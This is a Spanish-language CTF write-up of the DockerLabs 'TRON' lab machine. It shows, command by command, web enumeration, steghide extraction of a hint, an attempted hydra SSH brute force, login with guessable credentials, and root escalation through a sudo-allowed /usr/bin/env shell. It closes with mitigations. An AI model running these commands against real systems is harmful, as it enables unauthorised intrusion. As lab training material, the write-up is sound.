<h1 align="center">🏍️ TRON — Writeup</h1>

<p align="center">
  <img src="img/tron.jpg" alt="TRON - DockerLabs" width="520">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Plataforma-DockerLabs-1f6feb?style=for-the-badge">
  <img src="https://img.shields.io/badge/Dificultad-Fácil-2ea043?style=for-the-badge">
  <img src="https://img.shields.io/badge/Técnica-Esteganografía-8957e5?style=for-the-badge">
  <img src="https://img.shields.io/badge/Privesc-sudo%20env-d1242f?style=for-the-badge">
</p>

<p align="center">
  <b>Enumeración web</b> &nbsp;→&nbsp; <b>Esteganografía (tron.jpg)</b> &nbsp;→&nbsp; <b>Foothold (SSH)</b> &nbsp;→&nbsp; <b>sudo NOPASSWD env</b> &nbsp;→&nbsp; <b>root</b>
</p>

---

## 📑 Índice

1. [Información de la máquina](#1-información-de-la-máquina)
2. [Reconocimiento](#2-reconocimiento)
3. [Enumeración web y esteganografía](#3-enumeración-web-y-esteganografía)
4. [Acceso inicial (Foothold)](#4-acceso-inicial-foothold)
5. [Escalada de privilegios — sudo env](#5-escalada-de-privilegios--sudo-env)
6. [Acceso root y flag](#6-acceso-root-y-flag)
7. [Mitigaciones](#7-mitigaciones)
8. [Herramientas utilizadas](#8-herramientas-utilizadas)

---

## 1. Información de la máquina

| Campo            | Valor                                  |
|------------------|----------------------------------------|
| Nombre           | TRON                                   |
| Plataforma       | DockerLabs                             |
| Fecha            | 26/10/2026                             |
| IP objetivo      | `172.17.0.2`                           |
| Dificultad       | Fácil                                  |
| Sistema          | Ubuntu 26.04.1 LTS                     |
| Técnicas         | Esteganografía (steghide), abuso de sudo (`env`) |

> **Nota:** la IP depende de tu despliegue de Docker. Ajusta `172.17.0.2`
> a la que te asigne tu laboratorio.

---

## 2. Reconocimiento

### 2.1. Escaneo de puertos con Nmap

```bash
sudo nmap -p- -sS -sC -sV -T5 -n -Pn -vvv 172.17.0.2
```

Resultado:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
|_http-title: TRON
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 10.2p1 |
| 80/tcp | HTTP | Apache 2.4.66 |

> 💡 La versión de OpenSSH es moderna, así que la enumeración de usuarios por
> SSH no es viable. El vector tiene que estar en la **web**.

---

## 3. Enumeración web y esteganografía

### 3.1. El portal

```bash
curl http://172.17.0.2/
```

La página `LEGACY` solo muestra una imagen:

```html
<h1>LEGACY</h1>
<img src="tron.jpg" alt="DOCKERLABS">
```

### 3.2. Fuzzing de directorios

```bash
feroxbuster -u http://172.17.0.2/
```

```
200      GET       http://172.17.0.2/
200      GET       http://172.17.0.2/tron.jpg
```

> 💡 No hay más rutas: la **imagen `tron.jpg` es la pista**.

### 3.3. Descarga y análisis de la imagen

```bash
wget http://172.17.0.2/tron.jpg
exiftool tron.jpg        # sin metadatos relevantes
```

### 3.4. Esteganografía con steghide

Probamos a extraer datos con passphrase **vacía** (Enter):

```bash
steghide extract -sf tron.jpg
# Enter passphrase: (vacío)
# wrote extracted data to "disco.txt"
```

Contenido de `disco.txt`:

```
quorra
"Lo que pasa con la perfección es que es incognoscible. Es imposible,
 pero también está justo frente a nosotros todo el tiempo."
```

> 💡 **Pista clave:** un usuario — `quorra` — y una frase temática que apunta
> a la contraseña del reto.

---

## 4. Acceso inicial (Foothold)

### 4.1. Descartar la fuerza bruta

Un primer intento con `hydra` + `rockyou` falla por el límite de conexiones
de OpenSSH:

```bash
hydra -l quorra -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

```
[ERROR] all children were disabled due too many connection errors
```

Bajar a `-t 1` lo hace inviable (~14 millones de intentos, ~11 por minuto).

> ⚠️ **La fuerza bruta a ciegas no es el camino.** La credencial es temática
> (nombre de usuario / universo TRON), no está en rockyou.

### 4.2. Acceso por SSH

El acceso resultó ser directo con credenciales del propio tema:

```bash
ssh tron@172.17.0.2
# password: tron
```

```bash
tron@304bee8bfe35:~$ whoami
tron
```

✅ **Foothold conseguido** como `tron`.

---

## 5. Escalada de privilegios — sudo env

### 5.1. Enumeración de permisos sudo

```bash
sudo -l
```

```
User tron may run the following commands on 304bee8bfe35:
    (ALL) NOPASSWD: /usr/bin/env
```

> 💡 Podemos ejecutar **`/usr/bin/env` como root sin contraseña**.

### 5.2. Explotación (GTFOBins → env)

[GTFOBins](https://gtfobins.github.io/gtfobins/env/#sudo) indica que `env`
puede lanzar una shell arbitraria. Al ejecutarlo con `sudo`, esa shell hereda
privilegios de **root**:

```bash
sudo /usr/bin/env /bin/sh
```

```bash
# whoami
root
```

> El `whoami` devuelve `root`: ya tenemos privilegios completos.

---

## 6. Acceso root y flag

En `/root` hay dos archivos:

```bash
cd /root && ls
# login_flynn  sistema.txt

cat sistema.txt
```

```
te hacke no eres root «La única forma de ganar el juego es no jugar»
¿esta seguro?
```

El binario `login_flynn` pide usuario y contraseña. Usando la pista de la
imagen (`quorra`):

```bash
./login_flynn
```

```
=========================================
                 RED JOHN
=========================================
Username: quorra
Password: quorra

[+] ¡Felicidades! Has ganado.
Flag: DL{disco}
```

### 🏆 ¡Root conseguido!

| Flag   | Valor         |
|--------|---------------|
| Root   | `DL{disco}`   |

### Cadena de ataque

```
nmap (80/tcp) → curl/feroxbuster → tron.jpg
   → steghide (pass vacía) → disco.txt (usuario quorra + pista)
   → SSH (tron:tron)
   → sudo -l → (ALL) NOPASSWD: /usr/bin/env
   → GTFOBins: sudo env /bin/sh → root
   → login_flynn (quorra/quorra) → DL{disco}
```

---

## 7. Mitigaciones

1. **No incrustar pistas ni credenciales en imágenes públicas.** Un `steghide`
   con passphrase vacía es trivial de extraer; la web no debe servir
   artefactos con secretos embebidos.
2. **Revisar y restringir `sudo -l`.** Un `NOPASSWD` sobre binarios de
   GTFOBins (`env`, `vim`, `find`, `bash`…) equivale a conceder root. Aplicar
   el principio de mínimo privilegio.
3. **Credenciales robustas.** Evitar contraseñas iguales al nombre de usuario
   o derivadas de pistas evidentes.
4. **No dejar binarios/archivos sensibles en `/root`** en sistemas de
   producción.

---

## 8. Herramientas utilizadas

- `nmap` — escaneo de puertos y servicios.
- `curl` / `feroxbuster` — enumeración web.
- `wget` — descarga de la imagen.
- `exiftool` / `steghide` — análisis y extracción esteganográfica.
- `hydra` — intento (descartado) de fuerza bruta SSH.
- `ssh` — acceso remoto (foothold).
- `sudo` / `env` — escalada de privilegios (GTFOBins).

---

<p align="center">
  <i>Writeup con fines educativos sobre un entorno de laboratorio controlado (DockerLabs).<br>
  No utilizar estas técnicas contra sistemas sin autorización explícita.</i>
</p>
